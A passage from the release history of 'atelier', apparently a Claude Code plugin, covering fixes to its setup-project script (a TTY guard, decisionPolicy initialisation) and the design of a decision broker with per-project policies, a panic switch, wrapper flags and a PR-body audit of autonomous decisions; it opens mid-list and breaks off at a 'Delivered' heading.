2. **The step has no TTY guard.** When the operator runs `/atelier:setup-project` as a slash command, the Claude session's `Bash` tool spawns the binary in a subshell with no attached terminal. The existing gates check `$NONINTERACTIVE` and `$SKIP_POLICY` but neither is set in this path — the slash command does not pass `--yes` or `ATELIER_AUTO`. Without a TTY guard the prompt loop tries to `read -r choice` from a stdin that has no terminal, which depending on the parent flow either silently EOFs (writes nothing useful) or — under `set -u` with the color var bug — crashes outright.

**Delivered:**

- **`scripts/atelier-setup-project` `step_decision_policy` — non-TTY skip.** New gate after `$NONINTERACTIVE`: `if [ ! -t 0 ] || [ ! -t 1 ]; then POLICY_STATUS="skipped (no TTY — run /atelier:set-policy from a Claude session to configure)"; return; fi`. The status message tells the operator the right next step. `/atelier:set-policy` runs inside a Claude session but uses `AskUserQuestion` rather than `read`, so it works under any shell parent.
- **`scripts/atelier-setup-project` `step_decision_policy` — remove `_C_BOLD` / `_C_RESET` usage.** The single `printf '  %s%s%s\n' "$_C_BOLD" "$category" "$_C_RESET"` becomes `printf '  %s\n' "$category"`. Plain category name without bold emphasis. The per-category structure (blank line + indented name + indented metadata + indented prompt) still reads cleanly. Inline comment explains why colors went away.

**Decisions captured:**

- **Skip cleanly in non-TTY rather than define safe-default colors.** The original prompt loop's `read -r choice` cannot work without a TTY — even if the color crash were fixed via `${_C_BOLD:-}`, the function would just hang or EOF-loop through every category. Removing the color usage is a quality bug fix; adding the TTY guard is the functional bug fix. Both were needed.
- **TTY guard fails open with an informational message, not an exit-2 error.** A failed setup-project would block the rest of the slash command's Phase 2 (the project-profiler dispatch). The skip path with `POLICY_STATUS="skipped (no TTY — ...)"` lets the slash command proceed past Phase 1 and surface a final summary that names the right next step. The operator runs `/atelier:set-policy` and configures interactively; no half-state.
- **Operator's existing partial state from the crash is recoverable.** F46 already initialized the block to `{ "default": "ask", "byCategory": {} }` before the crash. That state is semantically correct — every category falls back to "ask", which is the conservative pre-broker behaviour. Running `/atelier:set-policy` from inside a Claude session walks the categories and fills in `byCategory`. No manual edit required; F47 just makes future runs not crash.
- **No fix for the slash command itself.** `commands/setup-project.md` could pass `--skip-policy` to the bash helper to sidestep the entire step (with the operator running `/atelier:set-policy` after as a separate action). But that would silently never prompt operators who run setup-project from a real shell with a TTY — they would lose the streamlined first-time-setup walk. The TTY guard in the bash helper is the right scope; the slash command flow continues to delegate the configuration to `/atelier:set-policy` for its own UX reasons.

**Plugin scope:** plugin-layer (`scripts/atelier-setup-project`). No template / hook / install.sh / agent / skill / command / catalog / docs change. Patch bump **0.9.1 → 0.9.2**. Cut **release v0.9.2** post-merge — same rationale as F46: every operator upgrading via `atelier-update` and running `/atelier:setup-project` on a pre-M4.26.b project hits this.

**Verified locally:**

- `bash -n scripts/atelier-setup-project` syntax-clean.
- `grep -nE "_C_BOLD|_C_RESET" scripts/atelier-setup-project` shows only the new inline comment that mentions the variables — no actual reference remains.
- Manual walkthrough of the four gate branches (`$SKIP_POLICY`, `$NONINTERACTIVE`, TTY check, `ATELIER_CONFIG_STATUS` case) — each routes to the right outcome with the right status message.

**Operator-visible:**

After this PR merges and the operator picks up v0.9.2 via `atelier-update`, re-running `/atelier:setup-project .` from inside an `atelier` Claude session will:

1. F46 init (if applicable) — write the `decisionPolicy` block with conservative defaults.
2. F47 TTY check — skip the prompt loop cleanly with status `skipped (no TTY — run /atelier:set-policy from a Claude session to configure)`.
3. Final summary names the right next step.

Then the operator runs `/atelier:set-policy` (separately, inside the same or a fresh Claude session) and the slash command walks each category via `AskUserQuestion`. Each answer goes into `byCategory` via the agent's `Edit` of `.atelier.json`. No bash `read` involved; no TTY required; clean UX.

**Follow-up paths:**

- **`atelier-setup-project` test harness.** This script has shipped four bugs that a smoke-test would have caught: F38 (stale settings preserved), F46 (block missing on preserved file), F47 (TTY guard + undefined colors). A simple harness that exercises the function in non-TTY mode would have caught F47 immediately. Defer until 0.9.x stabilizes.
- **Export color helpers consistently.** `install.sh` has `_C_BOLD` etc as common helpers; other scripts (`atelier-setup-project`, `atelier-doctor`, `atelier-update`) define their own or skip colors. Standardize via a shared `scripts/_colors.sh` sourcing pattern. Out of scope for v0.9.2.

### M7.1.F46 — `step_decision_policy` locked out operators whose `.atelier.json` predated M4.26.b — 2026-06-03
**PR:** [#125](https://github.com/AkaLab-Tech/atelier/pull/125)

Discovered immediately after v0.9.0 (the M4.26 series) was released and the operator went through the post-merge validation flow on storefront. The operator had already run `atelier /atelier:setup-project .` to migrate the project to M4.26.b's template, but a subsequent grep showed `.atelier.json` still lacked the `decisionPolicy` block. The broker would forever fall back to `ask` because the project had no policy to read.

**Root cause:**

[scripts/atelier-setup-project:641](scripts/atelier-setup-project) (the M4.26.b `step_decision_policy` gate) only ran the interactive prompts when `ATELIER_CONFIG_STATUS == "created"` — i.e. when this run of setup-project freshly wrote the `.atelier.json` from the template. Existing `.atelier.json` files were preserved by `step_atelier_config_json` (correct behaviour — F27's *"operator-owned after creation"* invariant), but `step_decision_policy` then bailed out with `POLICY_STATUS=skipped (.atelier.json preserved)` without ever checking whether the `decisionPolicy` block was present.

Operationally:

- An operator who set up the project BEFORE M4.26.b shipped had a `.atelier.json` that pre-dated the `decisionPolicy` schema.
- They ran `atelier-update` → templates refreshed at the config-dir layer with the new schema (M4.26.b's template now has the block).
- They re-ran `/atelier:setup-project .` → `.atelier.json` was preserved (correct; F27 invariant).
- `step_decision_policy` bailed out → block was never added.
- `/atelier:set-policy` is the intended revisit surface, but the operator did not know they needed to run it (and the command's prose is framed as "revise existing answers", not "initialize the block").

The intended UX from the M4.26.b HISTORY entry was *"`/atelier:set-policy` is the right surface for revising"* — but "revising" implies prior answers exist. For operators migrating from a pre-M4.26.b file, the block needed to be *initialized*, not *revised*. The gate was too coarse.

**Delivered:**

- **`scripts/atelier-setup-project` `step_decision_policy`** — refactored the early-return gate from `if [ "$ATELIER_CONFIG_STATUS" != "created" ]; then skip; fi` to a `case` block with three branches:
  - `created` — fresh file from this run; run prompts (unchanged from M4.26.b).
  - `preserved` — existing file. If `jq -e '.decisionPolicy'` returns true, skip silently with `POLICY_STATUS=skipped (.atelier.json preserved, decisionPolicy already present)`. If `.decisionPolicy` is missing, initialize the block via `jq '. + {decisionPolicy: {default: "ask", byCategory: {}}}'` (atomic via mktemp + mv, same pattern as the byCategory write later in the function), log `F46: initialized decisionPolicy block in pre-M4.26.b $target`, then fall through to the prompts.
  - Other (template missing, etc.) — skip with the original message.

- **Function-level documentation** — updated the comment block above `step_decision_policy` to describe the three-branch gate explicitly. The previous prose described only the "created" path, which made the M4.26.b skip-on-preserve invariant look like the intended behaviour for the F46 case it broke.

**Decisions captured:**

- **Initialize `decisionPolicy.default = "ask"` explicitly during the F46 path, not just `byCategory: {}`.** The broker reads `decisionPolicy.default` when a category is missing from `byCategory` (M4.26.a Step 3); leaving `default` undefined would have the broker fall back to its hardcoded "ask" — works but is implicit. Initializing the block in full is more legible and matches what M4.26.b's template ships.
- **F46 path runs ONLY when the block is missing entirely.** Preserved files with the block already configured stay untouched — same conservative invariant as before, just now correctly detected. An operator who explicitly set `decisionPolicy.byCategory.oversize-handling = "auto"` and then re-ran setup-project will NOT lose that setting; the gate sees the block, returns `skipped (preserved, decisionPolicy already present)`, and the prompts never run.
- **`case` block instead of nested `if`s.** Three distinct branches; the `case` form is more legible than chained `[ ... && ... ] || [ ... && ... ]` boolean. The script is plain bash 3.2 outside the install.sh shellrc heredoc (where `case`'s `)` would be problematic per the F44 lesson), so the construct is safe here.
- **`sublog "F46: initialized..."` makes the init path operator-visible.** When operator re-runs setup-project on a pre-M4.26.b project, they will see the explicit log line before the prompts start. Lets them understand WHY the prompts are running on a project they thought was already configured.
- **No changes to `commands/set-policy.md`.** The slash command's edge case *"`.atelier.json` is missing `decisionPolicy.byCategory`"* already covers the case where the operator never ran setup-project after M4.26.b (or used `--skip-policy`). F46 closes a different gap — the operator DID run setup-project but the gate locked them out. The slash command stays as a complementary revision surface.

**Plugin scope:** plugin-layer (`scripts/atelier-setup-project`). No template / hook / install.sh / agent / skill / command / catalog / docs change. Plugin patch bump **0.9.0 → 0.9.1** per PLAN.md §14.2. Cut **release v0.9.1** post-merge — the bug class blocks every operator who upgraded from v0.8.x to v0.9.0 via `atelier-update` (the supported flow). Without the release, those operators silently never get the broker, defeating M4.26.

**Verified locally:**

- `bash -n scripts/atelier-setup-project` syntax-clean post the refactor.
- Smoke-tested the F46 init path against a synthetic pre-M4.26.b `.atelier.json` (`{"prSize":{...}}` without the block). The `jq '. + {decisionPolicy: ...}'` merge correctly added the block AND preserved the existing `prSize` field. Re-running `jq -e '.decisionPolicy'` returned true.

**Operator-visible:**

After this PR merges and the operator picks up v0.9.1 via `atelier-update`, the next `atelier /atelier:setup-project <path>` invocation on an existing project will:

1. Preserve `.atelier.json` as before (operator-owned-after-creation per F27).
2. Detect that `.atelier.json` lacks the `decisionPolicy` block.
3. Initialize the block with the template's conservative defaults (`default: "ask"`, `byCategory: {}`).
4. Walk the 5-category interactive prompts.
5. Write the operator's per-category answers to `byCategory`.

For the specific operator who hit this on storefront: after merging v0.9.1, re-run `cd ~/Work/storefront && atelier /atelier:setup-project .` → the prompts will walk the catalog and the block will land. Replaces the manual `jq` workaround from the original message.

**Follow-up paths:**

- **`atelier-doctor` check for projects missing the `decisionPolicy` block.** Cross-reference `~/.claude-work/projects.json` against each project's `.atelier.json`; surface projects that lack the block as a friendly nudge. Defer until M4.26 has more dogfood — the doctor surface is for sticky persistent issues; F46 fixes the setup-project path which is the primary surface.
- **F46 self-test integration.** `atelier-setup-project` could emit a marker line when it ran the F46 init path (e.g. `atelier-decision-policy-bootstrapped=true`) so an upstream automation can detect migration events. Out of scope for v0.9.1.

### M4.26.e — Decision broker: PR-body audit section + operator-guide + troubleshooting — 2026-06-03
**PR:** [#124](https://github.com/AkaLab-Tech/atelier/pull/124)

Final slice of M4.26. Closes the audit loop and triggers the v0.9.0 release.

With the framework (M4.26.a, [#120](https://github.com/AkaLab-Tech/atelier/pull/120)), the policy surface (M4.26.b, [#121](https://github.com/AkaLab-Tech/atelier/pull/121)), the specialist integration (M4.26.c, [#122](https://github.com/AkaLab-Tech/atelier/pull/122)), and the panic switch + wrapper flags (M4.26.d, [#123](https://github.com/AkaLab-Tech/atelier/pull/123)) shipped, every autonomous decision is now logged to `<worktree>/.task-log/decisions.jsonl`. M4.26.e makes those decisions **operator-visible** at PR-review time and writes the operator-facing docs that complete the feature.

**Delivered:**

- **`agents/pr-author.md` step 6** — extends the PR body composition with a new section: `## Autonomous decisions taken (decision-broker)`. The agent reads `<worktree>/.task-log/decisions.jsonl` via the `Read` tool (not Bash — keeps the operation inside atelier's standard write/read path) and emits a Markdown table with one row per decision: Category, Choice, Mode, Confidence, Model, Rationale. Rows are prefixed with `⚠️ ` when ANY of these is true: (a) `confidence: low`, (b) `mode: auto` AND the catalog's `riskLevel` for the category is `high`, (c) `deviated_from_default: true`. The reviewer scans the ⚠️ rows; unmodified rows are routine. The whole section is skipped when the JSONL is missing, empty, or contains only `mode == "ask"` / `mode == "panic"` entries (those were operator-resolved interactively; restating in the PR body adds noise). Table is capped at 20 rows with a "... plus N additional, see decisions.jsonl" note if more exist.

- **`docs/operator-guide.md`** — new "How atelier makes decisions (decision broker)" section between "About permission prompts (auto-mode)" and "Keep atelier up to date". Operator-facing prose covering: classic examples that trigger the broker; how to configure (`/atelier:setup-project` first-run prompt, `/atelier:set-policy` for revisions, manual `.atelier.json` edit); per-task wrapper flags (`--policy=auto|ask`, `--ask-for=...`); panic switch (`/atelier:abort-auto` + `/atelier:resume-auto`); how to audit decisions in the PR body; what the broker is NOT (permission gate, safety net, operator-extensible). One place the operator can read to understand the entire feature.

- **`docs/troubleshooting.md`** — five new symptom-indexed entries under a "Decision broker (M4.26, v0.9.0+)" section:
  - *"atelier made a strategic decision I disagree with"* — explains the path: revert this PR by hand, set the category to `ask` for future tasks via `/atelier:set-policy`, or open an issue if the catalog default is wrong across all projects.
  - *"`/atelier:abort-auto` did not stop atelier from deciding autonomously"* — diagnoses the most likely cause (panic flag is per-worktree, operator ran abort-auto from a different worktree than the chain is in). Includes `git rev-parse --show-toplevel` check.
  - *"`task --policy=auto` didn't make atelier fully autonomous"* — explains the "specific beats global" precedence rule; suggests combining `--policy=auto --ask-for=<cats>` for surgical control.
  - *"`## Autonomous decisions taken` section is missing from a PR I expected it on"* — the broker resolved everything via `ask` / `panic`; `pr-author` skips the section when there's nothing autonomous to audit.
  - *"Catalog says my category is missing"* — atelier hit a strategic decision not catalogued; the fallback (ask) is correct; surface to the maintainer via an issue.

**Decisions captured:**

- **Skip the section when no autonomous decisions occurred.** Restating ask-resolved decisions in the PR body adds noise without adding signal — those were resolved interactively by the operator, who already saw the question. The section exists precisely to make the AUTONOMOUS calls visible. Empty section would hide the signal.
- **⚠️ marker on three specific conditions.** Tested mentally against the M7.1 dogfood Nivel 4 case (baseline-conflict): if a `baseline-conflict: fix-first` auto decision lands with `confidence: high`, the reviewer doesn't need to pause — that's the catalog's intended default. If the same decision lands with `confidence: low` OR with `deviated_from_default: true`, the reviewer should look. Three rules cover the cases that warrant manual review without flooding every row with ⚠️.
- **Cap the table at 20 rows.** A long-running task in a project with `--policy=auto` and many catalogued categories could log dozens of decisions. 20 is generous for normal use and keeps the PR body scannable. The note + JSONL pointer covers the audit tail.
- **`Read` tool, not `Bash(cat:*)`, for the JSONL.** Goes through atelier's standard write/read path (M2.4 hooks apply, settings allow/deny matrix applies). Same reasoning as M4.26.b's `commands/set-policy.md` using `Edit` over `Bash(jq | tee)`.
- **Operator-guide ordering.** Placed the new section AFTER "About permission prompts (auto-mode)" because the broker is the natural follow-up to auto-mode: auto-mode handles unenumerated PERMISSIONS, the broker handles unenumerated STRATEGIC DECISIONS. Same shape, different layer.
- **Five troubleshooting entries, not exhaustive.** Each one captures a real friction the operator might hit. More edge cases will surface in production; add them as they appear.

**Plugin scope:** plugin-layer (`agents/pr-author.md`) + docs-layer (`docs/operator-guide.md`, `docs/troubleshooting.md`). No template / hook / install.sh / skill / command / catalog change. **Plugin version stays at 0.9.0** — already at head-of-main from M4.26.a; M4.26.b/c/d/e all preserved that version per the operator's "bundle release" directive. **Release v0.9.0** is cut after this PR merges.

**Verified locally:**

- `agents/pr-author.md` still parses; the new sub-bullet under step 6 sits in the body-must-include list at the right ordering position (after Tracking, before step 7's "Report").
- `docs/operator-guide.md` table of contents preserved; the new section's anchor is between "About permission prompts" and "Keep atelier up to date".
- `docs/troubleshooting.md` entries follow the same `### <symptom> / **Symptom:** / **Cause:** / **Fix:**` structure as every other entry. The five new entries sit at the end of the file under a dedicated `## Decision broker (M4.26, v0.9.0+)` heading.

**Operator-visible:**

After this PR merges and the operator picks up v0.9.0 via the release flow:

1. Run `cd ~/atelier && git pull && ./install.sh` (the F7c re-inject path from M4.26.d's hooks-version bump 4→5 already landed; this run is idempotent).
2. Run `atelier-update` (refreshes `$ATELIER_CONFIG_DIR/templates/`).
3. For each registered project: `atelier /atelier:setup-project <path>` — F38's drift detector regenerates `.claude/settings.json`; the new `decisionPolicy` block in `templates/atelier.template.json` lands in `.atelier.json` (via M4.26.b's `step_decision_policy`). The first-run interactive prompt walks the operator through each category.
4. Next `task` invocation under `auto` policy triggers the broker; the resulting PR carries the audit section.

**Follow-up paths:**

- **`docs/research/decision-broker-catalog.md`** — a research artifact pinning the catalog format + a maintainer-facing backlog of candidate categories to add as dogfood surfaces them. **Deferred to a separate PR**. The current operator-facing docs are sufficient for v0.9.0; the research artifact is a maintainer-facing document.
- **`atelier-doctor` check for orphaned `.atelier-abort-auto.flag`** — when an operator forgets to `/atelier:resume-auto` and leaves the flag in a worktree, the broker keeps deferring. A doctor warning could surface this. Defer until the symptom is reported.
- **More categories.** Dogfood under v0.9.0 will surface situations not in the catalog. Each gets added in a patch release (0.9.x).

### M4.26.d — Decision broker: panic switch + task wrapper flags — 2026-06-02
**PR:** [#123](https://github.com/AkaLab-Tech/atelier/pull/123)

Fourth slice of M4.26. With the framework (M4.26.a, [PR #120](https://github.com/AkaLab-Tech/atelier/pull/120)), the configuration surface (M4.26.b, [PR #121](https://github.com/AkaLab-Tech/atelier/pull/121)), and the specialist integration (M4.26.c, [PR #122](https://github.com/AkaLab-Tech/atelier/pull/122)) shipped, M4.26.d adds the **two complementary controls** layered on top of the per-project policy: a panic switch the operator can flip mid-session, and per-invocation wrapper flags that override `.atelier.json` for a single task.

**Why:**

- **Panic switch.** Operators need an in-session escape valve. A task running under `auto` may go sideways in a way the operator can predict but does not want to cancel — they want every remaining strategic decision routed through them WITHOUT aborting the task. Editing `.atelier.json` mid-flight would require closing the Claude session (env not picked up live), and even then would change the policy globally for the project rather than just this task.
- **Wrapper flags.** Sometimes the operator knows in advance "this task is risky, I want maximum control" (`task --policy=ask`) or "this task is mechanical, run it full auto" (`task --policy=auto`), or wants surgical control over specific categories (`task --ask-for=scope-creep-detected,merge-conflict-substantive`). All three cases are per-invocation — the project policy stays unchanged.

**Delivered:**

- **`commands/abort-auto.md`** — slash command `/atelier:abort-auto [reason]`. Writes the panic flag at `<worktree>/.atelier-abort-auto.flag` with metadata: schema version, ISO 8601 UTC timestamp, optional operator-supplied reason (truncated at 200 chars). Uses `Write` (not `Bash(touch:*)`) so the change goes through atelier's standard write path. Idempotent — if the flag already exists, surfaces a "already active" message and returns. The broker (M4.26.a Step 1) checks this file FIRST in every resolution; presence → `mode: panic` → caller falls back to `AskUserQuestion` regardless of `.atelier.json` configuration.

- **`commands/resume-auto.md`** — slash command `/atelier:resume-auto`. Complementary to abort-auto: removes the panic flag via `Bash(rm)` (no `-f` — the existence check in step 2 already covers the absent case). Optionally reads the flag for the audit-friendly report (reason, duration since panic was active).

- **`install.sh` `task()` shell function** — extended to parse `--policy=<auto|ask>`, `--policy <auto|ask>` (separate-arg form), `--ask-for=<categories>`, and `--ask-for <categories>`. Parsing uses `if/elif/else` rather than `case` because the case-statement closing `)` would terminate the surrounding `$(cat <<'BLOCK' ...)` substitution that ships the function (same constraint as the existing PATH check). Validates `--policy` value (must be `auto` or `ask`), errors loudly otherwise. The parsed values become env vars `ATELIER_POLICY_OVERRIDE` and `ATELIER_ASK_FOR` passed to `claude` alongside the existing `CLAUDE_CONFIG_DIR` / `GH_CONFIG_DIR` / `GIT_CONFIG_GLOBAL` env chain. Args remaining after the flag pass are forwarded to `/atelier:next-task` verbatim (typical: a task id like `#42` or `#42a`).

- **`install.sh` shellrc hooks-version bump** — `# atelier-hooks-version: 4` → `5` (the heredoc text) AND `local current_version=4` → `5` (the F7c comparator). Bumped together per the F36 invariant; failing to bump both would silently skip the re-inject on existing operators' shells and they would keep using the pre-M4.26.d `task()` function body.

- **`skills/decision-broker/SKILL.md`** — new "Step 2.5 — Read per-invocation flag overrides (M4.26.d)" between Step 2 (catalog lookup) and Step 3 (project policy). Documents how `ATELIER_ASK_FOR` short-circuits to `mode: ask`, and how `ATELIER_POLICY_OVERRIDE` acts as a runtime override of `decisionPolicy.default` ONLY when the per-category `byCategory.<category>` entry is missing. The skill also gains an explicit precedence summary at the end of Step 3 (panic > ask-for > byCategory > policy-override > default > "ask").

**Decisions captured:**

- **Per-worktree, not per-project, not per-session.** The panic flag lives at `<worktree>/.atelier-abort-auto.flag` so a parallel task chain in a sibling worktree is unaffected. This matches the broker's existing per-worktree `decisions.jsonl` audit log — every decision and every panic toggle is keyed to a single worktree. The operator running two tasks in parallel can panic-switch one without affecting the other.
- **Wrapper flag values are env vars, not files.** The `task` wrapper is a shell function that already passes env vars to `claude` (CLAUDE_CONFIG_DIR, GH_CONFIG_DIR, GIT_CONFIG_GLOBAL). Adding two more vars is the consistent shape; a flag file would require a separate cleanup step the operator might forget. Env vars die with the session — naturally per-invocation.
- **Specific beats global.** A fixed `decisionPolicy.byCategory.<category>` value (e.g. `"fix-first"`) is NOT overridden by `ATELIER_POLICY_OVERRIDE`. The operator already configured a specific answer for this category; the wrapper flag is global; specific beats global. Conceptually consistent with how `--ask-for` is surgical (overrides only the listed categories).
- **`if/elif/else` for arg parsing in the heredoc.** Same F44 lesson: case-statement `)` inside `$(cat <<'BLOCK' ...)` terminates the substitution early. The parser is verbose but works.
- **No new `set -u`-safe array handling.** The `remaining` args are accumulated as a single space-separated string. Task ids in atelier (`#42`, `#42a`) never contain spaces, so the simpler form is acceptable. Operators passing complex args would break this, but they should not be passing complex args to `/atelier:next-task` — the slash command's contract is "optional task id".
- **Both versions bump atomically.** F36 invariant. Heredoc literal + comparator must move together; if only the heredoc moves, F7c reads `existing == current` from the operator's old block and silently skips the refresh. Verified by inline test of the new parser; verified by `grep -nE "current_version=|atelier-hooks-version:" install.sh` showing both at `5`.
- **`/atelier:abort-auto` and `/atelier:resume-auto` are configuration-only.** They write/remove ONE file and report. They do NOT invoke any specialist, do NOT read the catalog, do NOT touch task state. Single-purpose surface that the operator can reason about without thinking about side effects.
- **No `atelier-doctor` check for the panic flag.** The flag is per-worktree and ephemeral by design. An operator-doctor check would be either always-empty (when run from outside a worktree) or always-positive (operator just set it and is running doctor to verify). Not a useful surface for the doctor.

**Plugin scope:** plugin-layer (`commands/`) + plugin-layer (`skills/`) + host-OS-layer (`install.sh`). No template / hook / agent change. **Plugin version stays at 0.9.0** per the operator's directive — M4.26 ships as a single release after `.e` merges.

**Verified locally:**

- `bash -n install.sh` syntax-clean post all edits.
- `grep -nE "current_version=|atelier-hooks-version:" install.sh` confirms both lines at `5` (F36 invariant).
- The new `task()` parser was extracted and inline-tested with 6 scenarios: no-flags, `--policy=auto`, `--policy ask` (separate-arg form), `--ask-for=...`, combined `--policy=auto --ask-for=...`, and an invalid policy value. All produced the expected env-var setup and exit codes. The trailing exit 1 in the test output is the expected result of the invalid-value scenario.
- The two slash command files (`abort-auto.md` / `resume-auto.md`) parse as valid markdown with the right frontmatter shape (description, allowed-tools).
- The skill's new Step 2.5 sits between the existing Step 2 and Step 3 without disrupting the existing flow.

**Operator-visible:**

After this PR merges and the operator re-runs `install.sh` (the F7c re-inject path triggers because hooks-version 4 → 5), the new `task()` body lands in their `~/.zshrc`. From the next `task` invocation:

- `task #42` — unchanged from M4.26.c. Env vars empty; broker reads `.atelier.json` exclusively.
- `task --policy=auto #42` — runs in fully autonomous mode regardless of project policy (subject to fixed per-category settings winning over `--policy`).
- `task --policy=ask #42` — every catalogued decision is asked; useful for the "I want to be in the loop on this task" case.
- `task --ask-for=scope-creep-detected #42` — auto for everything else, but ask for scope creep specifically.
- Inside a long task chain, `/atelier:abort-auto "I see this going wrong"` writes the panic flag; every remaining decision is routed back to the operator. Later `/atelier:resume-auto` removes the flag and broker resumes per `.atelier.json` policy.

**Follow-up paths:**

- **M4.26.e** (queued, last) — `pr-author` reads `<worktree>/.task-log/decisions.jsonl` and adds a `## Autonomous decisions taken` section to the PR body so the reviewer can audit. Plus `docs/operator-guide.md` and `docs/troubleshooting.md` entries. Closes the audit loop and triggers the v0.9.0 release.

### M4.26.c — Decision broker: integrate into task-orchestrator + pr-author + operator-rules.md — 2026-06-02
**PR:** [#122](https://github.com/AkaLab-Tech/atelier/pull/122)

Third slice of M4.26. With the framework (M4.26.a, PR [#120](https://github.com/AkaLab-Tech/2/atelier/pull/120)) and the per-project configuration surface (M4.26.b, PR [#121](https://github.com/AkaLab-Tech/atelier/pull/121)) shipped, M4.26.c **wires the specialists** so the broker actually fires during task execution. The framework was dormant in v0.9.0 base; after this PR, an operator with `decisionPolicy.byCategory.oversize-handling = "auto"` in their `.atelier.json` will see the orchestrator carry out the broker's choice (slice-task / open-anyway / abort) without the operator being asked, with the autonomous rationale surfaced in the chain log.

**Delivered:**

- **`agents/task-orchestrator.md`** — new section "## Strategic decisions via the decision-broker (M4.26)" between "## Bash output handling" and "## Operating context". Explains the broker pattern, enumerates the 3 categories owned by the orchestrator (`baseline-conflict`, `oversize-handling`, `scope-creep-detected`), and documents the invocation protocol (briefing → `Skill(decision-broker)` → switch on `mode`). Plus a specific integration in step 8's `oversized` branch: the orchestrator now consults the broker BEFORE surfacing the three resolution paths to the operator. The `direct` and `auto` branches carry out the choice; `ask` / `panic` fall through to the original operator-facing path verbatim. The current behavior is fully preserved when the policy is `ask` (the conservative default), so existing operators see no behaviour change until they opt-in.
- **`agents/pr-author.md`** — step 5's OVERSIZE branch gets a brief note that `oversize-handling` is owned by the orchestrator, not `pr-author`. The size-check still detects + marks + returns `oversized` unchanged; the orchestrator consults the broker. Splitting the decision across two agents would double-log it and violate the broker's "one decision per category per task" invariant.
- **`operator-rules.md`** — new section "## Decision policy (M4.26)" at the end of the file. Explains in operator-facing prose what the broker is, what it is NOT (not a permission gate, not a safety net for unsafe writes, not operator-extensible), the 5 catalogued categories with their defaults / risk / model / owner agent, how to configure (`/atelier:setup-project`, `/atelier:set-policy`, manual edit), the deferred panic switch + wrapper flags (cross-references M4.26.d), and the deferred PR-body audit section (M4.26.e). Provides a single canonical reference for operators wondering "what does atelier decide autonomously and how do I control it".

**Why `unblocker` is NOT touched:**

The catalog includes `merge-conflict-substantive` and `merge-conflict-tracking` as categories. Conceptually `unblocker` owns the substantive flavor (when a rebase during the hard-stop path conflicts on real code). But atelier today does NOT rebase during `unblocker`'s flow — `unblocker` just creates the GitHub blocked issue with logs and marks `IN_PROGRESS.md`; the operator handles the rebase manually. The merge-conflict categories are catalogued for **future** integration (when atelier adds rebase support to the hard-stop or auto-resume flows). M4.26.c leaves `unblocker` untouched and adds a marker in `operator-rules.md` flagging the categories as "reserved for future rebase flows".

**Decisions captured:**

- **Single point of authority per category.** `oversize-handling` belongs to the orchestrator, not `pr-author`. `pr-author` detects + returns; the orchestrator decides. Inverting that would double-invoke the broker and split the audit log. The same pattern applies to `scope-creep-detected` (orchestrator owns; `implementer` returns the diff and the orchestrator detects the creep) and `baseline-conflict` (orchestrator detects from `/atelier:validate` output).
- **Existing operator-facing prose stays as the fallback.** The oversized branch in `task-orchestrator.md` step 8 still contains the original three-resolution-paths text verbatim. The broker integration is wrapped as "consult the broker FIRST; if it returns `ask` or `panic`, the original path applies." This keeps the diff small, the fallback obvious, and makes the integration auditable — a reviewer can see exactly what changed and what stayed the same.
- **`pr-author` does NOT invoke the broker.** Even though `pr-author` is the agent that first detects the oversize condition, the orchestrator is the authority for the decision. Keeps `pr-author` narrowly scoped to "open the PR or report why not", which matches its role across all the other failure modes (validation failures, push failures, gate failures — all surface to the orchestrator).
- **No `task-orchestrator` step-1 invocation for `baseline-conflict`.** The category is *catalogued* — the orchestrator will consult the broker when a baseline conflict actually arises — but there is no explicit step in the orchestrator's flow today that detects baseline conflicts. The detection happens inside `/atelier:validate`; when validate reports failures that look like pre-existing baseline issues (heuristic: failing files outside the diff's touched paths), step 7's inner loop is the natural place to invoke the broker. M4.26.c documents the category in the new section but does NOT add the detection logic — that is a follow-up if/when an operator hits the symptom for a second time and the heuristic can be calibrated against the real case.
- **`operator-rules.md` covers configuration, not invocation.** The orchestrator prose covers HOW to invoke the broker (briefing schema, mode switch); the operator-rules prose covers WHAT the policy means and HOW to configure it. Two audiences, two documents.

**Plugin scope:** plugin-layer (agents/, operator-rules.md). No template / script / hook / install.sh change. **Plugin version stays at 0.9.0** per the operator's directive — M4.26 series ships as a single release after `.e` merges.

**Verified locally:**

- Each touched agent still parses as markdown (no broken sections).
- The new section in `task-orchestrator.md` sits before "## Operating context" — same placement convention used for the F39 "Bash output handling" section in the same file.
- The integration in step 8's oversized branch preserves the original operator-facing text under "The original path (broker said `ask`, or broker not available):" — verifiable by diff.

**Operator-visible:**

After this PR merges and the operator picks up head-of-main via `atelier-update`, the broker actually starts firing during task chains. The behaviour the operator experiences depends entirely on their `decisionPolicy`:

- Fresh-install default (`decisionPolicy.default = "ask"`, `byCategory: {}`) → zero behaviour change from pre-M4.26.c. Every catalogued situation surfaces to the operator exactly as before, via `AskUserQuestion` in the original prose paths.
- Operator opted-in to `auto` for `oversize-handling` → next time `pr-author` returns `oversized`, the orchestrator consults the broker (Haiku 4.5, ~3s), gets back `{choice: "slice-task" | "open-anyway" | "abort"}` plus a rationale, carries out the choice, and surfaces the rationale in the chain log. The operator sees `"==> oversize-handling: slice-task per broker (high, haiku) — <rationale>"` instead of the three-options-stop block. The PR body section (M4.26.e) will surface this same decision visibly when M4.26.e merges.
- Operator opted-in to a fixed option (`decisionPolicy.byCategory.oversize-handling = "slice-task"`) → no LLM call. The orchestrator invokes `/atelier:slice-task` immediately and restarts step 1.

**Follow-up paths:**

- **M4.26.d** (queued, next) — panic switch (`/atelier:abort-auto` + `/atelier:resume-auto`) and `task --policy=` / `--ask-for=` wrapper flags. The operator-rules.md section already references these as deferred; the slash commands + the install.sh `task()` heredoc extension + the broker skill's env-var override land in M4.26.d.
- **M4.26.e** (queued, last) — `pr-author` reads `<worktree>/.task-log/decisions.jsonl` and adds a `## Autonomous decisions taken` section to the PR body so the reviewer can audit. Plus `docs/operator-guide.md` and `docs/troubleshooting.md` entries. Closes the audit loop.

### M4.26.b — Decision broker: per-project policy schema + setup-project interactive step + /atelier:set-policy slash command — 2026-06-02
**PR:** [#121](https://github.com/AkaLab-Tech/atelier/pull/121)

Second slice of M4.26. M4.26.a (PR [#120](https://github.com/AkaLab-Tech/atelier/pull/120)) shipped the framework dormant — the catalog, the skill, and the three risk-tier evaluator agents existed but no specialist invoked them. M4.26.b adds the **per-project configuration surface** so the operator can decide, per category, whether atelier handles a strategic decision autonomously (auto), surfaces it (ask), or always picks a specific catalog option (fixed id). Without M4.26.b an operator has no way to opt into the broker — every category falls back to `ask` because the project file has no policy block to read.

**Delivered:**

